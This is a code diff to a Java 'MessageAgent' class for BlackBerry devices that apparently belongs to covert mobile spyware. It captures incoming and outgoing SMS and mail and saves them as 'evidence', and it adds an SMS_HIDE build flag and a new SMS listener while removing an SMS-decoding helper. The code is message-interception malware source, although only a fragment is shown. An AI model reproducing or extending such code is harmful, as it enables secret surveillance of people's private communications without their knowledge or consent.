@@ -9,13 +9,9 @@
  * *************************************************/
 package blackberry.agent;
 
-import java.io.UnsupportedEncodingException;
 import java.util.Date;
 import java.util.Enumeration;
 import java.util.Vector;
-
-import javax.wireless.messaging.BinaryMessage;
-import javax.wireless.messaging.TextMessage;
 
 import net.rim.blackberry.api.mail.Address;
 import net.rim.blackberry.api.mail.Header;
@@ -31,6 +27,7 @@ import blackberry.agent.mail.MailListener;
 import blackberry.agent.mail.MailParser;
 import blackberry.agent.mail.Prefix;
 import blackberry.agent.sms.SmsListener;
+import blackberry.agent.sms.SmsListener45;
 import blackberry.config.Conf;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
@@ -117,7 +114,12 @@ public final class MessageAgent extends Agent implements SmsObserver,
         //#endif
 
         mailListener = MailListener.getInstance();
-        smsListener = SmsListener.getInstance();
+        
+        //#ifdef SMS_HIDE
+        
+        //#else
+        smsListener = SmsListener45.getInstance();
+        //#endif
         //smsListener.setMessageAgent(this);
     }
 
@@ -449,7 +451,7 @@ public final class MessageAgent extends Agent implements SmsObserver,
         //lastcheck = new Date(0); 
     }
 
-    public void onNewSms(final javax.wireless.messaging.Message message,
+    public void onNewSms(final byte[] message, String address,
             final boolean incoming) {
         //#ifdef DBC
         Check.requires(message != null, "saveLog: null message");
@@ -459,9 +461,9 @@ public final class MessageAgent extends Agent implements SmsObserver,
         debug.trace("saveLog: " + message);
         //#endif
 
-        final byte[] dataMsg = getSmsDataMessage(message);
+        //final byte[] dataMsg = getSmsDataMessage(message);
         //#ifdef DBC
-        Check.asserts(dataMsg != null, "saveLog: null dataMsg");
+        Check.asserts(message != null, "saveLog: null dataMsg");
         //#endif
 
         //final ByteArrayOutputStream os = null;
@@ -475,7 +477,7 @@ public final class MessageAgent extends Agent implements SmsObserver,
 
             String from;
             String to;
-            String address = message.getAddress();
+            
 
             // Check if it's actually a sms
 
@@ -539,8 +541,8 @@ public final class MessageAgent extends Agent implements SmsObserver,
             //#endif
 
             // Creating log
-            if (dataMsg != null) {
-                createEvidence(additionalData, dataMsg, EvidenceType.SMS_NEW);
+            if (message != null) {
+                createEvidence(additionalData, message, EvidenceType.SMS_NEW);
                 return;
             } else {
                 //#ifdef DEBUG
@@ -557,49 +559,7 @@ public final class MessageAgent extends Agent implements SmsObserver,
         }
     }
 
-    /**
-     * @param message
-     * @param dataMsg
-     * @return
-     */
-    private byte[] getSmsDataMessage(
-            final javax.wireless.messaging.Message message) {
-
-        byte[] dataMsg = null;
-
-        if (message instanceof TextMessage) {
-            final TextMessage tm = (TextMessage) message;
-            final String msg = tm.getPayloadText();
-            //#ifdef DEBUG
-            debug.info("Got Text SMS: " + msg);
-            //#endif
-
-            dataMsg = WChar.getBytes(msg);
-
-        } else if (message instanceof BinaryMessage) {
-            dataMsg = ((BinaryMessage) message).getPayloadData();
-
-            try {
-
-                //String msg16 = new String(data, "UTF-16BE");
-                final String msg8 = new String(dataMsg, "UTF-8");
-
-                //#ifdef DEBUG
-                //debug.trace("saveLog msg16:" + msg16);
-                debug.trace("saveLog msg8:" + msg8);
-                //#endif
-
-            } catch (final UnsupportedEncodingException e) {
-                //#ifdef DEBUG
-                debug.error("saveLog:" + e);
-                //#endif
-            }
-            //#ifdef DEBUG
-            debug.info("Got Binary SMS, len: " + dataMsg.length);
-            //#endif
-        }
-        return dataMsg;
-    }
+  
 
     private String getMySmsAddress() {
         final String number = Phone.getDevicePhoneNumber(false);
